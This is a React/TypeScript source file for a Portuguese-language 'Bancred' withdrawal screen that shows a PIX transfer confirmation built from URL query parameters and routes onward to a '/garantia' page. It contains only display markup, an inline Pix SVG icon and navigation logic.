import { useNavigate, useSearchParams } from "react-router-dom";
import { ArrowLeft, AlertCircle, House, ArrowDownToLine, User } from "lucide-react";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 22 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
    </g>
  </svg>
);

const Divider = () => <div style={{ height: 1, background: "#E5E7EB", margin: "12px 0" }} />;

const SaqueConfirmar = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();

  const valor = Number(params.get("valor") || 5000);
  const nome = (params.get("nome") || "Cliente").toUpperCase();
  const cpf = params.get("cpf") || "";
  const chave = params.get("chave") || cpf;
  const tipoChave = params.get("tipoChave") || "CPF";
  const banco = params.get("banco") || "Banco do Brasil";

  const agora = new Date().toLocaleString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  const handleConfirmar = () => {
    navigate(`/garantia?${params.toString()}`);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#F4F4F7", paddingBottom: 110, fontFamily: fontStack }}>
      <header style={{ background: "#1C68E3", color: "#fff", padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <button onClick={() => navigate(-1)} style={{ background: "transparent", border: "none", color: "#fff", display: "inline-flex", alignItems: "center", gap: 4, fontSize: 14, fontWeight: 500, cursor: "pointer", fontFamily: fontStack }}>
          <ArrowLeft size={18} /> Voltar
        </button>
        <span style={{ fontSize: 18, fontWeight: 800, letterSpacing: -0.4 }}>Bancred</span>
        <div style={{ width: 60 }} />
      </header>

      <main style={{ padding: 14, maxWidth: 480, margin: "0 auto" }}>
        <div style={{ background: "#fff", borderRadius: 16, padding: 22, border: "1px solid #E5E7EB", boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)" }}>
          <h1 style={{ fontSize: 18, fontWeight: 700, color: "#111827", textAlign: "center", marginBottom: 18 }}>Confirmar Transferência</h1>

          <div>
            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Valor</div>
            <div style={{ fontSize: 24, fontWeight: 800, color: "#1C68E3" }}>{formatBRL(valor)}</div>
          </div>
          <Divider />
          <div>
            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>De</div>
            <div style={{ fontWeight: 700, color: "#111827", fontSize: 14 }}>{nome}</div>
            {cpf && <div style={{ color: "#6B7280", fontSize: 13, marginTop: 2 }}>{cpf}</div>}
          </div>
          <Divider />
          <div>
            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Para</div>
            <div style={{ fontSize: 14, color: "#111827" }}>
              <strong>{tipoChave}:</strong> {chave}
            </div>
            <div style={{ fontSize: 13, color: "#6B7280", marginTop: 2 }}>Banco: {banco}</div>
          </div>
          <Divider />
          <div>
            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Quando</div>
            <div style={{ fontWeight: 700, color: "#111827", fontSize: 14 }}>{agora}</div>
          </div>
          <Divider />
          <div>
            <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Tipo</div>
            <div style={{ display: "inline-flex", alignItems: "center", gap: 8 }}>
              <span style={{ width: 28, height: 28, background: "#fff", border: "1px solid #E5E7EB", borderRadius: 6, display: "inline-flex", alignItems: "center", justifyContent: "center", padding: 4 }}>
                <PixIcon size={18} />
              </span>
              <span style={{ fontWeight: 700, color: "#111827", fontSize: 14 }}>PIX</span>
            </div>
          </div>

          <div style={{ background: "#FEF9C3", border: "1px solid #FDE68A", borderRadius: 10, padding: 12, fontSize: 12, color: "#92400E", marginTop: 18, lineHeight: 1.5, display: "flex", gap: 8 }}>
            <AlertCircle size={14} style={{ flexShrink: 0, marginTop: 1 }} />
            <span>Verifique todos os dados antes de confirmar. Transferências PIX são instantâneas e não podem ser canceladas.</span>
          </div>

          <div style={{ marginTop: 16, display: "flex", flexDirection: "column", gap: 8 }}>
            <button
              type="button"
              onClick={handleConfirmar}
              style={{ width: "100%", padding: "15px 20px", background: "#1C68E3", color: "#fff", border: "none", borderRadius: 14, fontSize: 16, fontWeight: 700, cursor: "pointer", boxShadow: "0 8px 24px rgba(28,104,227,0.28)", fontFamily: fontStack, minHeight: 52 }}
            >
              Confirmar Transferência
            </button>
            <button
              type="button"
              onClick={() => navigate(-1)}
              style={{ width: "100%", padding: "12px 18px", background: "#fff", color: "#111827", border: "1px solid #E5E7EB", borderRadius: 10, fontSize: 14, fontWeight: 600, cursor: "pointer", fontFamily: fontStack }}
            >
              Editar dados
            </button>
          </div>
        </div>
      </main>

      <nav style={{ position: "fixed", bottom: 0, left: 0, right: 0, background: "#fff", borderTop: "1px solid #E5E7EB", display: "grid", gridTemplateColumns: "repeat(3, 1fr)", padding: "8px 0 calc(8px + env(safe-area-inset-bottom))", zIndex: 50 }}>
        {[
          { Icon: House, label: "Home", active: false, to: `/dashboard?${params.toString()}` },
          { Icon: ArrowDownToLine, label: "Saque", active: true, to: `/saque?${params.toString()}` },
          { Icon: User, label: "Meus Dados", active: false, to: `/dashboard?${params.toString()}` },
        ].map(({ Icon, label, active, to }) => (
          <button key={label} type="button" onClick={() => navigate(to)} style={{ background: "transparent", border: "none", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, color: active ? "#1C68E3" : "#6B7280", cursor: "pointer", padding: 4, fontSize: 11, fontWeight: active ? 600 : 500, fontFamily: fontStack }}>
            <Icon size={20} />
            {label}
          </button>
        ))}
      </nav>
    </div>
  );
};

export default SaqueConfirmar;
